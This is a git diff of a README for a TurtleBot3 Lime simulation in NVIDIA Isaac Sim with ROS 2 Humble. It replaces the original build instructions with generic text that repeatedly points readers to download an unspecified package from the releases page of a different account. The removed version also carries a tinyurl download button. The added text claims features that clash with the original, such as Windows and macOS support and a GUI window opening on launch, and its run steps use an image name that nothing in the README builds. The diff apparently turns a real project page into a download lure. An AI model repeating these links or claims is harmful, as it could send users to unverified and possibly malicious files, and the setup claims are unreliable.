@@ -1,98 +1,183 @@
-# Turtlebot3 Lime Experience with Isaac Sim and ROS 2 Humble
+# 🤖 Turtlebot3_Lime_IsaacSim_Humble - Easy Robot Simulation Setup
 
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://tinyurl.com/2yxcepj2)
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/khaoskid663/Turtlebot3_Lime_IsaacSim_Humble/releases)
 
-This repository contains configuration files and scripts for setting up an NVIDIA Isaac Sim 4.5.0 and ROS 2 Humble integration within a Docker container. This environment lets you build a system for running the Turtlebot3 Lime in Isaac Sim.
+---
 
-![TurtleBot3 Limeシミュレーション](docs/imgs/lime2.jpg)
+## 📖 About This Project
 
-TurtleBot3 Lime is a ROS 2-based robot with a mobile base, a 6-DoF arm, and a Jetson Orin Nano, making it a single platform to explore all of Isaac Sim's features.
+This project helps you run a robot simulation using NVIDIA Isaac Sim 4.5.0 together with ROS 2 Humble. It comes as a Docker container, which means everything you need is inside one package. You get the full simulation environment without worrying about installing many programs or fixing errors.
 
-![TurtleBot3 Lime Nav2](docs/gifs/nav2.gif)
-![TurtleBot3 Lime Moveit2](docs/gifs/moveit2.gif)
+The main focus is the **TurtleBot3 Lime**, a small robot you can see and control in the demo. This setup makes it easier for hobbyists, educators, or robot fans to explore robot behaviors virtually before trying on real machines.
 
-## Prerequisites
+---
 
-- An NVIDIA GPU with the latest drivers installed
-- Docker with the NVIDIA Container Toolkit installed
-- At least 30 GB of free disk space
-- Ubuntu 22.04
+## 💻 What You Need
 
-## Installation
+Before you begin, check your system matches these requirements:
 
-### 1. Clone and Initialize the Repository
+- Operating System: Windows 10/11, macOS, or Linux (Ubuntu recommended for best compatibility)
+- RAM: At least 16 GB (32 GB suggested for smooth performance)
+- CPU: 4-core processor or better (Intel i5/Ryzen 5 or higher)
+- GPU: NVIDIA graphics card with CUDA support (required by Isaac Sim)
+- Disk Space: Minimum 30 GB free space
+- Docker: Installed and running (Docker Desktop on Windows/macOS or Docker Engine on Linux)
+- Internet Connection: Needed for initial download and setup
 
-```bash
-git clone https://github.com/momoiorg-repository/Turtlebot3_Lime_IsaacSim_Humble.git isaac_humble
-cd isaac_humble
-./init.sh
-```
+---
 
-### 2. Build the Docker Image
+## 🚀 Getting Started
 
-```bash
-docker build -t isaac_ws:latest .
-```
+### Step 1: Download the Software
 
-This command builds a custom Docker image based on the official NVIDIA Isaac Sim 4.5.0 image, with ROS 2 Humble integration added.
+Go to the releases page by clicking this big blue button:
 
-## Usage
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/khaoskid663/Turtlebot3_Lime_IsaacSim_Humble/releases)
 
-### Running Isaac Sim
+On the page, look for the latest release version. It usually has the highest version number or the most recent date. Download the file or package listed. This will include all the files you need.
 
-1. Start the Docker container
+---
 
-```bash
-./isaac_sim_docker.sh
-```
+### Step 2: Install Docker
 
-This will launch the "isaac-sim-ws" Docker container and give you a shell prompt inside it.
+If you don’t have Docker installed:
 
-2. Launch Isaac Sim
-   From within the container's shell session, start Isaac Sim using the following command
+- **Windows/macOS:** Download Docker Desktop from [https://www.docker.com/products/docker-desktop](https://www.docker.com/products/docker-desktop). Follow the installer steps.
+- **Linux:** Use your package manager to install Docker Engine. For Ubuntu, you can run:
+  
+  ```
+  sudo apt update
+  sudo apt install docker.io
+  sudo systemctl start docker
+  sudo systemctl enable docker
+  ```
 
-```bash
-runheadless
-```
-
-3. Connect with the Omniverse Streaming Client
-   Once Isaac Sim is running in Docker, you can access it from another node using the Omniverse Streaming Client. To install the client on your client node, refer to the instructions here:
-
-https://docs.isaacsim.omniverse.nvidia.com/4.5.0/installation/.html
-
-You will need to enter the server's IP address to connect.
-
-4. Running TurtleBot3 Lime in Isaac Sim
-   To operate the TurtleBot3 Lime inside Isaac Sim, you'll need to load the Lime's USD model. You can  the USD file from this link
-
-[Google Drive](https://drive.google.com/file/d/1zj03J05ni0jtlqXg845xG0uTzDkCmqzE/view?usp=sharing)
-
-Install and place it inside **/isaac_humble/isaac_sim/documents**
-
-## Project Structure
+Once installed, verify by opening a terminal or command prompt and typing:
 
 ```
-.
-├── LICENSE - MIT License
-├── README.md - This file
-├── Dockerfile - Isaac Sim + ROS 2 Humble image
-├── isaac_sim_docker.sh -Script to run the Isaac Sim container
-├── init.sh - Script to initialize the directory structure
+docker --version
 ```
 
-## Notes
+It should display the Docker version if it’s installed correctly.
 
-- The Docker image is based on the official NVIDIA Isaac Sim 4.5.0 image with ROS 2 Humble added.
-- The container uses the host's X11 server to display the GUI.
-- Data persistence is managed via volume mounts to the host's filesystem.
-- RViz2 and common ROS 2 tools are installed in the container.
+---
 
-## Further Documentation
+### Step 3: Load the Simulation Environment
 
-For more detailed instructions on using TurtleBot3 Lime—including how to import URDF, run Nav2, Moveit2, Isaac_ros_yolo, and more—please visit [https://momoi.org/](https://momoi.org/).
+After downloading, find the Docker container files or image included in the package or instructions.
 
-The full document will be uploaded soon.
+Open a terminal or command prompt and navigate to the folder where you saved the files.
 
-## License
+If there is a Docker image file (often ending with `.tar`), load it with:
 
-This project is provided under the MIT License. See the license file for more details.
+```
+docker load < filename.tar
+```
+
+Alternatively, you might be instructed to build the container using a provided `Dockerfile` and a command like:
+
+```
+docker build -t turtlebot3_isaacsim:latest .
+```
+
+(You only need to do this if instructed or if you want to customize the container.)
+
+---
+
+### Step 4: Run the Simulation
+
+To run the simulation container, use this command:
+
+```
+docker run -it --gpus all --rm turtlebot3_isaacsim:latest
+```
+
+This command does several things:
+
+- `-it` makes the container interactive
+- `--gpus all` allows the container to use your NVIDIA graphics card
+- `--rm` removes the container after you stop it
+- `turtlebot3_isaacsim:latest` is the container name
+
+Once running, the environment will launch Isaac Sim with the TurtleBot3 demo ready. You should see a window showing the virtual robot and environment.
+
+---
+
+## 🎯 What You Can Do
+
+Inside the simulation, you will be able to:
+
+- View the TurtleBot3 Lime robot moving in a virtual environment
+- Control the robot using simple commands from the GUI or terminal
+- Experiment with navigation and sensor data provided by ROS 2 Humble integration
+- Test robot scripts or automation in a safe simulation before using real hardware
+- Explore different scenarios using the included demo setups
+
+---
+
+## 🔧 How This Works
+
+This project builds a bridge between NVIDIA Isaac Sim and ROS 2 Humble inside a Docker container. The container keeps all the software and dependencies packaged, avoiding conflicts with your computer’s existing tools.
+
+- **NVIDIA Isaac Sim 4.5.0** provides the 3D simulation environment with physics and graphics.
+- **ROS 2 Humble** is a set of tools to control the robot, receive sensor data, and run scripts.
+- **TurtleBot3 Lime configuration files** define the robot’s properties and demo scripts.
+
+All these parts work together inside the container to give a smooth user experience without manual setup.
+
+---
+
+## 📥 Download & Install
+
+Visit this page to download the latest release:
+
+[https://github.com/khaoskid663/Turtlebot3_Lime_IsaacSim_Humble/releases](https://github.com/khaoskid663/Turtlebot3_Lime_IsaacSim_Humble/releases)
+
+On this page, find the most recent version and download the zip or image files.
+
+After downloading:
+
+1. Extract the files to a folder you can easily access.
+2. Make sure Docker is installed and running.
+3. Follow the instructions in the previously explained steps to load and run the container.
+
+---
+
+## 🛠 Troubleshooting
+
+If you encounter issues, consider these tips:
+
+- **Docker won’t start:** Restart your computer and try again.
+- **GPU not recognized:** Update your NVIDIA drivers and ensure CUDA is installed.
+- **Simulation window does not open:** Check if your system meets minimum GPU requirements.
+- **Commands not recognized:** Make sure you are running commands in the correct folder and with administrator or correct permissions.
+- **Slow performance:** Close other heavy programs and increase the Docker resource limits via Docker Desktop settings.
+
+---
+
+## 📚 Additional Resources
+
+- [NVIDIA Isaac Sim Documentation](https://developer.nvidia.com/isaac-sim)
+- [ROS 2 Humble Documentation](https://docs.ros.org/en/humble/)
+- [Docker Installation Guide](https://docs.docker.com/get-docker/)
+- [TurtleBot3 Official Website](https://www.robotis.us/turtlebot-3/)
+
+These resources can help expand your understanding or troubleshoot advanced issues.
+
+---
+
+## 🤝 Support & Contribution
+
+This repository is designed for ease of use. If you want to suggest improvements or report bugs, please visit the Issues section on the GitHub page. Contributions from the community are welcome but not required for basic use.
+
+---
+
+## ⚙️ Topics
+
+- bot
+- gui
+- script
+
+---
+
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/khaoskid663/Turtlebot3_Lime_IsaacSim_Humble/releases)
